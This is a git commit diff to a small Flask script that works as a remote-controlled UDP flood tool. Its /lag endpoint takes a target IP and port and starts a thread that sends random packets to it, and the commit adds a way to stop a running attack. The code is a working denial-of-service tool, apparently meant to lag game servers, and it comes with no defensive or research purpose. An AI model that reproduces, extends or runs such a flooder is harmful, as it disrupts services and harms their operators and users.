3bc6fa731b386cdbf34bfc74e1f5bb587a53544a
Engdark 🌹 <ang089afk@gmail.com>
2025-02-09 21:53:58 +0100

    Update script.py

--- script.py
+++ script.py
@@ -1,7 +1,7 @@
 from flask import Flask, request, jsonify
 import threading
 import socket
-import random 
+import random
 import string
 
 app = Flask(__name__)
@@ -10,7 +10,6 @@ active_attacks = {}
 def send_udp_packets(server_ip, server_port, stop_event):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     random_text_number = ''.join(random.choices(string.ascii_letters + string.digits, k=99))
-    #message = "fuck_garena" * 99
     message = random_text_number
 
     try:
@@ -32,6 +31,13 @@ def lag():
 
     try:
         port = int(port)
+        
+        if (ip, port) in active_attacks:
+            stop_event = active_attacks[(ip, port)]["stop_event"]
+            stop_event.set()
+            del active_attacks[(ip, port)]
+            return jsonify({"message": f"Stopped attack on {ip}:{port}"}), 200
+
         stop_event = threading.Event()
         thread = threading.Thread(target=send_udp_packets, args=(ip, port, stop_event))
         thread.start()
@@ -40,6 +46,7 @@ def lag():
             "stop_event": stop_event
         }
         return jsonify({"message": f"Started sending data to {ip}:{port}"}), 200
+
     except ValueError:
         return jsonify({"error": "Port must be a valid integer"}), 400
 
